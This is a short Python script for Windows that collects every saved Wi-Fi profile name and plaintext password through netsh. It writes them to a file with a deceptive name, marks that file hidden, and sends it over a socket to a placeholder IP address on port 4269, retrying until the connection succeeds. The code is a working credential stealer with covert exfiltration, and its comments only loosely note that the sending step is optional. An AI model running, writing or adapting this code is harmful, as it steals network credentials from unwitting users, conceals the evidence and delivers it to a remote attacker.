import subprocess
import re
import socket
import time
import ctypes
import os

wifi_list = []
#this list will store the passwords and name of wifi temporally
cmd_output1 = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], 
    capture_output = True, 
    text = True
    )
#this runs the command to show all the saved profiles
outputs = re.findall(r"All User Profile\s*:\s*(.+)", 
                    cmd_output1.stdout,
                    )

#this picks out all the profile names only 

for output in outputs:

    wifi_dic = {}
#All the wifi names and passwords are saved in this dictionary
    wifi_name = re.sub(r'[\[\]"]', '', output.strip())
#Strips the brackets
    cmdoutput2 = subprocess.run(
        ['netsh', 'wlan', 'show', 'profile', f'{wifi_name}', 'key=clear'],
        capture_output=True
        ).stdout.decode()
#this runs the command to show all the wifi passwords of each profile
    
    password = re.search("Key Content            : (.*)\r", cmdoutput2) 
#Picks out just the passwords of each profile   
    if password == None:
        wifi_dic[wifi_name] = None
    else:
        wifi_dic[wifi_name] = password[1]
    wifi_list.append(wifi_dic)        
#Appends the wifi names and passwords to wifi_dic
with open ('nothing_to_see_here420869.txt', 'w') as f:
    f.write(str(wifi_list))
#it makes a file and writes the passwords in

#Sending via socket to a specific ip
HOST = 'INSERT IP HERE'
PORT = 4269
file= 'nothing_to_see_here420869.txt'

if os.path.exists(file):
    # 0x02 sets the file attribute to hidden
    # You wont be able to see the password if its hidden. Turn on view hidden files in windows file explorer to see this.
    ctypes.windll.kernel32.SetFileAttributesW(file, 0x02)
# This will send the password file to a specific ip. If you dont want it to do that you can delete the below part.
with open (file, 'rb') as file, socket.socket() as s:

    while True:

        try:
            s.connect((HOST, PORT))
            break 
        except (ConnectionRefusedError, TimeoutError):
            time.sleep(1)

    while True:
        chunk = file.read(4096)
        if not chunk:
            break 
        s.sendall(chunk)
    
